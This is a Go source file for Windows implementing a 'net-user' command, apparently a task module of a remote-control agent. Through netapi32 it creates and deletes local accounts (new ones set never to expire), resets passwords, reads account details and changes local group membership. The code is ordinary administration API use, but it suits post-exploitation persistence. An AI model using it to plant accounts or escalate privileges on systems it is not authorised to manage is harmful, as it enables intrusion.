//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"strings"
	"syscall"
	"unsafe"

	"fawkes/pkg/structs"
	"golang.org/x/sys/windows"
)

type NetUserCommand struct{}

func (c *NetUserCommand) Name() string {
	return "net-user"
}

func (c *NetUserCommand) Description() string {
	return "Manage local user accounts and group membership via Win32 API"
}

type netUserArgs struct {
	Action   string `json:"action"`
	Username string `json:"username"`
	Password string `json:"password"`
	Group    string `json:"group"`
	FullName string `json:"fullname"`
	Comment  string `json:"comment"`
}

var (
	netapi32NU              = windows.NewLazySystemDLL("netapi32.dll")
	procNetUserAdd          = netapi32NU.NewProc("NetUserAdd")
	procNetUserDel          = netapi32NU.NewProc("NetUserDel")
	procNetUserGetInfo      = netapi32NU.NewProc("NetUserGetInfo")
	procNetUserSetInfo      = netapi32NU.NewProc("NetUserSetInfo")
	procNetLocalGroupAddMem = netapi32NU.NewProc("NetLocalGroupAddMembers")
	procNetLocalGroupDelMem = netapi32NU.NewProc("NetLocalGroupDelMembers")
	procNetApiBufferFreeNU  = netapi32NU.NewProc("NetApiBufferFree")
)

const (
	USER_PRIV_USER     = 1
	UF_SCRIPT          = 0x0001
	UF_NORMAL_ACCOUNT  = 0x0200
	UF_DONT_EXPIRE     = 0x10000
	UF_ACCOUNTDISABLE  = 0x0002
	UF_LOCKOUT         = 0x0010
	UF_PASSWD_NOTREQD  = 0x0020
	UF_PASSWD_CANT_CHG = 0x0040
	USER_INFO_1_LEVEL  = 1
	USER_INFO_4_LEVEL  = 4
	USER_UF_INFO       = 1008 // level for setting flags
)

// USER_INFO_1 for NetUserAdd (level 1)
type userInfo1 struct {
	Name     *uint16
	Password *uint16
	PasswordAge uint32
	Priv     uint32
	HomeDir  *uint16
	Comment  *uint16
	Flags    uint32
	ScriptPath *uint16
}

// USER_INFO_1003 for setting password
type userInfo1003 struct {
	Password *uint16
}

// USER_INFO_4 for detailed info (level 4)
type userInfo4 struct {
	Name           *uint16
	Password       *uint16
	PasswordAge    uint32
	Priv           uint32
	HomeDir        *uint16
	Comment        *uint16
	Flags          uint32
	ScriptPath     *uint16
	AuthFlags      uint32
	FullName       *uint16
	UsrComment     *uint16
	Params         *uint16
	Workstations   *uint16
	LastLogon      uint32
	LastLogoff     uint32
	AcctExpires    uint32
	MaxStorage     uint32
	UnitsPerWeek   uint32
	LogonHours     uintptr
	BadPwCount     uint32
	NumLogons      uint32
	LogonServer    *uint16
	CountryCode    uint32
	CodePage       uint32
	UserSid        uintptr
	PrimaryGroupID uint32
	Profile        *uint16
	HomeDirDrive   *uint16
	PasswordExpired uint32
}

// LOCALGROUP_MEMBERS_INFO_3 for add/remove member
type lgMemberInfo3 struct {
	DomainAndName *uint16
}

func (c *NetUserCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: parameters required. Actions: add, delete, info, password, group-add, group-remove",
			Status:    "error",
			Completed: true,
		}
	}

	var args netUserArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	switch strings.ToLower(args.Action) {
	case "add":
		return netUserAdd(args)
	case "delete":
		return netUserDelete(args)
	case "info":
		return netUserInfo(args)
	case "password":
		return netUserPassword(args)
	case "group-add":
		return netUserGroupAdd(args)
	case "group-remove":
		return netUserGroupRemove(args)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s\nAvailable: add, delete, info, password, group-add, group-remove", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

func netUserAdd(args netUserArgs) structs.CommandResult {
	if args.Username == "" {
		return structs.CommandResult{
			Output:    "Error: username is required for add action",
			Status:    "error",
			Completed: true,
		}
	}
	if args.Password == "" {
		return structs.CommandResult{
			Output:    "Error: password is required for add action",
			Status:    "error",
			Completed: true,
		}
	}

	namePtr, _ := syscall.UTF16PtrFromString(args.Username)
	passPtr, _ := syscall.UTF16PtrFromString(args.Password)

	var commentPtr *uint16
	if args.Comment != "" {
		commentPtr, _ = syscall.UTF16PtrFromString(args.Comment)
	}

	info := userInfo1{
		Name:     namePtr,
		Password: passPtr,
		Priv:     USER_PRIV_USER,
		Comment:  commentPtr,
		Flags:    UF_SCRIPT | UF_NORMAL_ACCOUNT | UF_DONT_EXPIRE,
	}

	var parmErr uint32
	ret, _, _ := procNetUserAdd.Call(
		0, // local server
		1, // level 1
		uintptr(unsafe.Pointer(&info)),
		uintptr(unsafe.Pointer(&parmErr)),
	)

	if ret != 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error creating user '%s': NetUserAdd returned %d (parm_err=%d)", args.Username, ret, parmErr),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Successfully created user '%s'", args.Username),
		Status:    "success",
		Completed: true,
	}
}

func netUserDelete(args netUserArgs) structs.CommandResult {
	if args.Username == "" {
		return structs.CommandResult{
			Output:    "Error: username is required for delete action",
			Status:    "error",
			Completed: true,
		}
	}

	namePtr, _ := syscall.UTF16PtrFromString(args.Username)

	ret, _, _ := procNetUserDel.Call(
		0, // local server
		uintptr(unsafe.Pointer(namePtr)),
	)

	if ret != 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error deleting user '%s': NetUserDel returned %d", args.Username, ret),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Successfully deleted user '%s'", args.Username),
		Status:    "success",
		Completed: true,
	}
}

func netUserInfo(args netUserArgs) structs.CommandResult {
	if args.Username == "" {
		return structs.CommandResult{
			Output:    "Error: username is required for info action",
			Status:    "error",
			Completed: true,
		}
	}

	namePtr, _ := syscall.UTF16PtrFromString(args.Username)

	var buf uintptr
	ret, _, _ := procNetUserGetInfo.Call(
		0, // local server
		uintptr(unsafe.Pointer(namePtr)),
		4, // level 4 — detailed info
		uintptr(unsafe.Pointer(&buf)),
	)

	if ret != 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error getting info for '%s': NetUserGetInfo returned %d", args.Username, ret),
			Status:    "error",
			Completed: true,
		}
	}
	defer procNetApiBufferFreeNU.Call(buf)

	info := (*userInfo4)(unsafe.Pointer(buf))

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("User: %s\n", windows.UTF16PtrToString(info.Name)))
	if info.FullName != nil {
		fn := windows.UTF16PtrToString(info.FullName)
		if fn != "" {
			sb.WriteString(fmt.Sprintf("Full Name: %s\n", fn))
		}
	}
	if info.Comment != nil {
		c := windows.UTF16PtrToString(info.Comment)
		if c != "" {
			sb.WriteString(fmt.Sprintf("Comment: %s\n", c))
		}
	}

	// Privilege level
	switch info.Priv {
	case 0:
		sb.WriteString("Privilege: Guest\n")
	case 1:
		sb.WriteString("Privilege: User\n")
	case 2:
		sb.WriteString("Privilege: Administrator\n")
	}

	// Flags
	var flags []string
	if info.Flags&UF_ACCOUNTDISABLE != 0 {
		flags = append(flags, "Disabled")
	} else {
		flags = append(flags, "Enabled")
	}
	if info.Flags&UF_LOCKOUT != 0 {
		flags = append(flags, "Locked Out")
	}
	if info.Flags&UF_DONT_EXPIRE != 0 {
		flags = append(flags, "Password Never Expires")
	}
	if info.Flags&UF_PASSWD_NOTREQD != 0 {
		flags = append(flags, "No Password Required")
	}
	if info.Flags&UF_PASSWD_CANT_CHG != 0 {
		flags = append(flags, "Cannot Change Password")
	}
	sb.WriteString(fmt.Sprintf("Flags: %s\n", strings.Join(flags, ", ")))

	sb.WriteString(fmt.Sprintf("Password Age: %d days\n", info.PasswordAge/86400))
	sb.WriteString(fmt.Sprintf("Bad Password Count: %d\n", info.BadPwCount))
	sb.WriteString(fmt.Sprintf("Number of Logons: %d\n", info.NumLogons))

	if info.LastLogon > 0 {
		sb.WriteString(fmt.Sprintf("Last Logon: %d (Unix timestamp)\n", info.LastLogon))
	} else {
		sb.WriteString("Last Logon: Never\n")
	}

	if info.PasswordExpired == 1 {
		sb.WriteString("Password Expired: Yes\n")
	}

	if info.Profile != nil {
		p := windows.UTF16PtrToString(info.Profile)
		if p != "" {
			sb.WriteString(fmt.Sprintf("Profile: %s\n", p))
		}
	}

	if info.HomeDir != nil {
		h := windows.UTF16PtrToString(info.HomeDir)
		if h != "" {
			sb.WriteString(fmt.Sprintf("Home Directory: %s\n", h))
		}
	}

	if info.LogonServer != nil {
		ls := windows.UTF16PtrToString(info.LogonServer)
		if ls != "" {
			sb.WriteString(fmt.Sprintf("Logon Server: %s\n", ls))
		}
	}

	sb.WriteString(fmt.Sprintf("Primary Group ID: %d\n", info.PrimaryGroupID))

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func netUserPassword(args netUserArgs) structs.CommandResult {
	if args.Username == "" {
		return structs.CommandResult{
			Output:    "Error: username is required for password action",
			Status:    "error",
			Completed: true,
		}
	}
	if args.Password == "" {
		return structs.CommandResult{
			Output:    "Error: password is required for password action",
			Status:    "error",
			Completed: true,
		}
	}

	namePtr, _ := syscall.UTF16PtrFromString(args.Username)
	passPtr, _ := syscall.UTF16PtrFromString(args.Password)

	info := userInfo1003{
		Password: passPtr,
	}

	ret, _, _ := procNetUserSetInfo.Call(
		0, // local server
		uintptr(unsafe.Pointer(namePtr)),
		1003, // level 1003 — password only
		uintptr(unsafe.Pointer(&info)),
		0, // parm_err
	)

	if ret != 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error setting password for '%s': NetUserSetInfo returned %d", args.Username, ret),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Successfully changed password for '%s'", args.Username),
		Status:    "success",
		Completed: true,
	}
}

func netUserGroupAdd(args netUserArgs) structs.CommandResult {
	if args.Username == "" {
		return structs.CommandResult{
			Output:    "Error: username is required for group-add action",
			Status:    "error",
			Completed: true,
		}
	}
	if args.Group == "" {
		return structs.CommandResult{
			Output:    "Error: group is required for group-add action",
			Status:    "error",
			Completed: true,
		}
	}

	groupPtr, _ := syscall.UTF16PtrFromString(args.Group)
	memberPtr, _ := syscall.UTF16PtrFromString(args.Username)

	member := lgMemberInfo3{
		DomainAndName: memberPtr,
	}

	ret, _, _ := procNetLocalGroupAddMem.Call(
		0, // local server
		uintptr(unsafe.Pointer(groupPtr)),
		3, // level 3
		uintptr(unsafe.Pointer(&member)),
		1, // totalentries
	)

	if ret != 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error adding '%s' to group '%s': NetLocalGroupAddMembers returned %d", args.Username, args.Group, ret),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Successfully added '%s' to local group '%s'", args.Username, args.Group),
		Status:    "success",
		Completed: true,
	}
}

func netUserGroupRemove(args netUserArgs) structs.CommandResult {
	if args.Username == "" {
		return structs.CommandResult{
			Output:    "Error: username is required for group-remove action",
			Status:    "error",
			Completed: true,
		}
	}
	if args.Group == "" {
		return structs.CommandResult{
			Output:    "Error: group is required for group-remove action",
			Status:    "error",
			Completed: true,
		}
	}

	groupPtr, _ := syscall.UTF16PtrFromString(args.Group)
	memberPtr, _ := syscall.UTF16PtrFromString(args.Username)

	member := lgMemberInfo3{
		DomainAndName: memberPtr,
	}

	ret, _, _ := procNetLocalGroupDelMem.Call(
		0, // local server
		uintptr(unsafe.Pointer(groupPtr)),
		3, // level 3
		uintptr(unsafe.Pointer(&member)),
		1, // totalentries
	)

	if ret != 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error removing '%s' from group '%s': NetLocalGroupDelMembers returned %d", args.Username, args.Group, ret),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Successfully removed '%s' from local group '%s'", args.Username, args.Group),
		Status:    "success",
		Completed: true,
	}
}
